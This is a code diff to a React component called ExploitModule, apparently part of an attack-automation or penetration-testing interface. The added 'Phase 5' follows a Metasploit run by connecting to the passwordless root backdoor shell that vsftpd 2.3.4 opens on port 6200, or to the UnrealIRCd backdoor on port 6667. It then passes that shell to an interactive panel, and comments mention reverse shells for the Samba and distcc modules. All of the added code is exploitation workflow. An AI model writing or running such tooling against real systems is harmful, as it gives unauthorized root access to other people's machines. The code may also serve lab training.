@@ -6629,6 +6629,32 @@ function ExploitModule({token, onRunningChange}) {
           log(`⚠ Phase 4: No session opened — ${r4.message}`);
           log(`   Try: check target is running, verify MSF module/payload, or try manual exploit`);
         }
+
+        // ─── Phase 5: Connect SHELL terminal to the backdoor port ─────
+        // For vsftpd 2.3.4 the exploit OPENS a passwordless root shell on
+        // port 6200 of the target — we can connect directly with TCP and
+        // expose it through the SHELL panel for an interactive demo. Same
+        // pattern for distccd (it spawns whatever payload we run; cmd shells
+        // call back to LHOST:LPORT which is already handled by MSF).
+        const moduleLower = (msfModule||"").toLowerCase();
+        let backdoorPort = null;
+        if (moduleLower.includes("vsftpd_234"))             backdoorPort = 6200;
+        else if (moduleLower.includes("unreal_ircd_3281"))   backdoorPort = 6667; // backdoor on same port
+        // (samba/distcc use reverse shells, handled by MSF handler — skip)
+        if (backdoorPort) {
+          log(`🔌 Phase 5: Connecting shell to ${targetIP}:${backdoorPort}...`);
+          try {
+            const rc = await callApi("/api/exploit/shell/connect", {target: targetIP, port: backdoorPort});
+            if (rc.ok) {
+              setShellLid(rc.lid);
+              setShellStatus("connected");
+              startShellPoll(rc.lid);
+              log(`✅ Phase 5: Shell connected — type commands below`);
+            } else {
+              log(`⚠ Phase 5: Could not connect to backdoor — ${rc.error||"unknown"}`);
+            }
+          } catch(e) { log(`⚠ Phase 5: ${e.message}`); }
+        }
       }
 
       log("─────────────────────────────────");
